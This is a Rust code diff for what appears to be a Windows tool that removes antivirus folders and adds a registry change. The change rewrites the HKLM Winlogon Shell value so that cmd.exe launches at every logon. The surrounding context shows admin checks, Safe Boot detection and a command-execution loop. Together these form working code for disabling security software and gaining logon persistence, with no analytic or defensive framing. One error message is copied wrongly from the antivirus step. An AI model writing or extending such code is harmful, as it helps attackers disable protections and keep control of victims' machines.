@@ -6,6 +6,8 @@ use std::env;
 use wmi::{WMIConnection, COMLibrary};
 use windows::Win32::System::SystemInformation::GetOsSafeBootMode;
 use windows::Win32::Foundation::BOOL;
+use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_WRITE};
+use winreg::RegKey;
 
 fn is_admin() -> bool {
     let output = Command::new("whoami")
@@ -77,6 +79,23 @@ fn remove_antivirus_folder() -> Result<(), Box<dyn std::error::Error>> {
             }
         }
     }
+
+    Ok(())
+}
+
+fn modify_registry() -> io::Result<()> {
+    // Open the registry key for Winlogon with write access
+    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
+    let (winlogon_key, _disp) = hkcu.create_subkey_with_flags(
+        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
+        KEY_WRITE,
+    )?;
+
+    // Set the new "Shell" value
+    let new_shell_value = r"%SystemRoot%\explorer.exe, cmd.exe /c start explorer.exe";
+    winlogon_key.set_value("Shell", &new_shell_value)?;
+
+    println!("Registry modified successfully: Shell set to \"{}\".", new_shell_value);
 
     Ok(())
 }
@@ -245,8 +264,13 @@ fn main() -> io::Result<()> {
             execute_command(command);
         }
         
-        // Group 10: Reboot the system to Safe Mode if needed
+        // Group 10: Remove antivirus folder
         if let Err(e) = remove_antivirus_folder() {
+            eprintln!("Error removing antivirus folder: {}", e);
+        }
+        
+        // Group 11: Modify registry for explorer.exe
+        if let Err(e) = modify_registry() {
             eprintln!("Error removing antivirus folder: {}", e);
         }
 
